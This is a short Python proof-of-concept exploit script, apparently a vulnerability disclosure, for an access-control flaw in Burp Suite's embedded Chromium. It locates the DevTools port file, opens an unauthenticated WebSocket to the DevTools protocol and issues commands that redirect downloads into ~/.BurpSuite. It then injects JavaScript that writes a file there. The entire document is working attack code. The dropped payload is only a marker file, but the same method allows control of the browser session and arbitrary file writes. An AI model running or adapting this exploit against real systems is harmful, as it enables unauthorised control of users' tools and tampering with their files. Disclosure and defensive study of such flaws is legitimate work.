#!/usr/bin/env python3
"""
Burp Suite Embedded Chromium - WebSocket Auth Bypass (Local PoC)
Demonstrates CWE-284: Improper Access Control
"""
import os, glob, json, time
try:
    from websocket import create_connection
except ImportError:
    print("Please install websocket-client: pip install websocket-client")
    exit(1)

print("[*] Starting Burp Suite WebSocket Auth Bypass PoC...")

# 1. Discover the active DevTools port and UUID
data_dirs = glob.glob("/var/folders/*/*/T/burp/browser/data/*/*/DevToolsActivePort")
if not data_dirs:
    print("[-] No active Burp Chromium session found. Start a crawl in Burp first.")
    exit(1)

latest_file = max(data_dirs, key=os.path.getmtime)
with open(latest_file) as f:
    lines = f.read().splitlines()
    port = lines[0]
    uuid_path = lines[1]

ws_url = f"ws://127.0.0.1:{port}{uuid_path}"
print(f"[+] Discovered DevTools Endpoint: {ws_url}")

# 2. Connect via WebSocket (Bypasses x-burp-authorization)
print("[*] Establishing unauthenticated WebSocket connection...")
try:
    ws = create_connection(ws_url)
    print("[+] Connection established! Auth bypass successful.")
except Exception as e:
    print(f"[-] Connection failed: {e}")
    exit(1)

# 3. Prove control by setting download path
target_dir = os.path.expanduser("~/.BurpSuite")
print(f"[*] Sending CDP command: Browser.setDownloadBehavior -> {target_dir}")
ws.send(json.dumps({
    "id": 1,
    "method": "Browser.setDownloadBehavior",
    "params": {
        "behavior": "allow",
        "downloadPath": target_dir
    }
}))

response = ws.recv()
print(f"[+] CDP Response: {response}")

# 4. Prove arbitrary file write capability
print("[*] Triggering file download (arbitrary file write)...")
payload = "POC_SUCCESS=TRUE\n"
html_payload = f"""
const blob = new Blob(['{payload}'], {{type: 'text/plain'}});
const a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'poc_proof.txt';
a.click();
"""

ws.send(json.dumps({
    "id": 2,
    "method": "Runtime.evaluate",
    "params": {"expression": html_payload}
}))

response = ws.recv()
print(f"[+] CDP Response: {response}")
ws.close()

print(f"\n[!!!] PoC Complete. Check {target_dir}/poc_proof.txt")
